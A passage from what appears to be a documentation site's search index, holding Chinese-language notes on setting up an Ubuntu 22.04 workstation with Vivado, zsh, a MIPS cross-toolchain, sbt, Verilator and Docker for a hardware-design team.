$ sudo apt install libncurses5 \u5728 .bashrc \u6587\u4ef6\u4e2d\u6dfb\u52a0 $ source /opt/xilinx/Vivado/2019.2/settings64.sh 6. texlive $ sudo apt install texlive 7. \u6dfb\u52a0\u65b0\u7528\u6237\u7ec4 $ sudo groupadd nscscc2022 $ sudo useradd -m -G nscscc2022 ty # -m \u521b\u5efa\u76ee\u5f55 -G \u6dfb\u52a0\u81f3\u7528\u6237\u7ec4 $ sudo useradd -m -G nscscc2022 wjj $ sudo passwd ty $ sudo passwd wjj \u5b89\u88c5zsh $ sudo apt install zsh \u914d\u7f6eoh-my-zsh $ sh -c \" $( curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh \\ | sed 's|^REPO=.*|REPO=${REPO:-mirrors/oh-my-zsh}|g' \\ | sed 's|^REMOTE=.*|REMOTE=${REMOTE:-https://gitee.com/${REPO}.git}|g' ) \" 8. \u9f99\u82af\u73af\u5883\u914d\u7f6e # install mipsel cross compiler $ sudo apt install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu $ sudo apt install gdb-multiarch $ sudo apt install qemu-system-mipsel # \u8fd9\u4e2aqemu\u7684\u7248\u672c\u8fc7\u9ad8\u4e86 # install java $ sudo apt install openjdk-11-jdk # install sbt $ sudo apt-get update $ sudo apt-get install apt-transport-https curl gnupg -yqq $ echo \"deb https://repo.scala-sbt.org/scalasbt/debian all main\" | sudo tee /etc/apt/sources.list.d/sbt.list $ echo \"deb https://repo.scala-sbt.org/scalasbt/debian /\" | sudo tee /etc/apt/sources.list.d/sbt_old.list $ curl -sL \"https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x2EE0EA64E40A89B84B2DF73499E82A75642AC823\" | sudo -H gpg --no-default-keyring --keyring gnupg-ring:/etc/apt/trusted.gpg.d/scalasbt-release.gpg --import $ sudo chmod 644 /etc/apt/trusted.gpg.d/scalasbt-release.gpg $ sudo apt-get update $ sudo apt-get install sbt # install verilator $ sudo apt-get install verilator 9. docker\u5b89\u88c5 [\u53c2\u8003\u5b89\u88c5\u6587\u7ae0](https://docs.docker.com/engine/install/ubuntu/ $ sudo apt-get update $ sudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ lsb-release $ sudo mkdir -p /etc/apt/keyrings $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg $ echo \\ \"deb [arch= $( dpkg --print-architecture ) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $( lsb_release -cs ) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null $ sudo apt-get update $ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin docker \u89e3\u51b3 qemu-system-mipsel \u7248\u672c\u95ee\u9898 $ sudo docker pull ubuntu:20.04 $ sudo docker run -it -name ubuntu20 -v ~:/ccc ubuntu:20.04 /bin/bash \u76ee\u5f55\u6302\u8f7d $ sudo docker start ubuntu20 $ sudo docker exec -it ubuntu20 /bin/bash $ apt-get update $ apt-cache madison qemu-system-mips # \u67e5\u770b\u53ef\u7528\u7248\u672c $ apt install qemu-system-mips = 1 :4.2-3ubuntu6.23 \u7136\u540e\u91cd\u590d8\u4e2d\u7684\u6b65\u9aa4 \u5176\u4ed6\u4e00\u4e9b\u8f6f\u4ef6\u7684\u5b89\u88c5 sudo apt-get install p7zip-full # 7-zip","title":"Ubuntu22.04 \u5b89\u88c5\u8bb0\u5f55"},{"location":"tutorials/ubuntu/#ubuntu2204","text":"","title":"Ubuntu22.04 \u5b89\u88c5\u8bb0\u5f55"},{"location":"tutorials/ubuntu/#0","text":"$ sudo apt install tmux $ sudo apt install git $ sudo apt install vim $ sudo apt install make $ sudo apt install g++","title":"0. \u57fa\u7840\u8f6f\u4ef6"},{"location":"tutorials/ubuntu/#1-chrome","text":"\u53c2\u8003\u5b89\u88c5\u6587\u7ae0","title":"1. Chrome\u6d4f\u89c8\u5668"},{"location":"tutorials/ubuntu/#2","text":"\u53c2\u8003\u5b89\u88c5\u6587\u7ae0","title":"2. \u4e2d\u6587\u8f93\u5165\u6cd5"},{"location":"tutorials/ubuntu/#3-ssh","text":"","title":"3. \u5c40\u57df\u7f51 ssh \u767b\u5f55"},{"location":"tutorials/ubuntu/#1-zjunet","text":"ZJUNET\u4ed3\u5e93 $ zjunet user add # \u6ce8\u610fuser name \u540e\u9762\u8981\u63a5\u4e0a@abc\uff0c\u5176\u4e2da\u8868\u793a10\u5143\uff0cb\u8868\u793a30\u5143\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 $ zjunet vpn -c","title":"1) zjunet"},{"location":"tutorials/ubuntu/#2-ssh","text":"$ sudo apt-get install openssh-server","title":"2) ssh\u670d\u52a1"},{"location":"tutorials/ubuntu/#5-vivado","text":"\u5b89\u88c5vivado2019.2 $ sudo apt install libncurses5 \u5728 .bashrc \u6587\u4ef6\u4e2d\u6dfb\u52a0 $ source /opt/xilinx/Vivado/2019.2/settings64.sh","title":"5. vivado"},{"location":"tutorials/ubuntu/#6-texlive","text":"$ sudo apt install texlive","title":"6. texlive"},{"location":"tutorials/ubuntu/#7","text":"$ sudo groupadd nscscc2022 $ sudo useradd -m -G nscscc2022 ty # -m \u521b\u5efa\u76ee\u5f55 -G \u6dfb\u52a0\u81f3\u7528\u6237\u7ec4 $ sudo useradd -m -G nscscc2022 wjj $ sudo passwd ty $ sudo passwd wjj \u5b89\u88c5zsh $ sudo apt install zsh \u914d\u7f6eoh-my-zsh $ sh -c \" $( curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh \\ | sed 's|^REPO=.*|REPO=${REPO:-mirrors/oh-my-zsh}|g' \\ | sed 's|^REMOTE=.*|REMOTE=${REMOTE:-https://gitee.com/${REPO}.git}|g' ) \"","title":"7. \u6dfb\u52a0\u65b0\u7528\u6237\u7ec4"},{"location":"tutorials/ubuntu/#8","text":"# install mipsel cross compiler $ sudo apt install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu $ sudo apt install gdb-multiarch $ sudo apt install qemu-system-mipsel # \u8fd9\u4e2aqemu\u7684\u7248\u672c\u8fc7\u9ad8\u4e86 # install java $ sudo apt install openjdk-11-jdk # install sbt $ sudo apt-get update $ sudo apt-get install apt-transport-https curl gnupg -yqq $ echo \"deb https://repo.scala-sbt.org/scalasbt/debian all main\" | sudo tee /etc/apt/sources.list.d/sbt.list $ echo \"deb https://repo.scala-sbt.org/scalasbt/debian /\" | sudo tee /etc/apt/sources.list.d/sbt_old.list $ curl -sL \"https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x2EE0EA64E40A89B84B2DF73499E82A75642AC823\" | sudo -H gpg --no-default-keyring --keyring gnupg-ring:/etc/apt/trusted.gpg.d/scalasbt-release.gpg --import $ sudo chmod 644 /etc/apt/trusted.gpg.d/scalasbt-release.gpg $ sudo apt-get update $ sudo apt-get install sbt # install verilator $ sudo apt-get install verilator","title":"8. \u9f99\u82af\u73af\u5883\u914d\u7f6e"},{"location":"tutorials/ubuntu/#9-docker","text":"[\u53c2\u8003\u5b89\u88c5\u6587\u7ae0](https://docs.docker.com/engine/install/ubuntu/ $ sudo apt-get update $ sudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ lsb-release $ sudo mkdir -p /etc/apt/keyrings $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg $ echo \\ \"deb [arch= $( dpkg --print-architecture ) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $( lsb_release -cs ) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null $ sudo apt-get update $ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin","title":"9. docker\u5b89\u88c5"},{"location":"tutorials/ubuntu/#docker-qemu-system-mipsel","text":"$ sudo docker pull ubuntu:20.04 $ sudo docker run -it -name ubuntu20 -v ~:/ccc ubuntu:20.04 /bin/bash \u76ee\u5f55\u6302\u8f7d $ sudo docker start ubuntu20 $ sudo docker exec -it ubuntu20 /bin/bash $ apt-get update $ apt-cache madison qemu-system-mips # \u67e5\u770b\u53ef\u7528\u7248\u672c $ apt install qemu-system-mips = 1 :4.2-3ubuntu6.23 \u7136\u540e\u91cd\u590d8\u4e2d\u7684\u6b65\u9aa4","title":"docker \u89e3\u51b3 qemu-system-mipsel \u7248\u672c\u95ee\u9898"},{"location":"tutorials/ubuntu/#_1","text":"sudo apt-get install p7zip-full # 7-zip","title":"\u5176\u4ed6\u4e00\u4e9b\u8f6f\u4ef6\u7684\u5b89\u88c5"}]}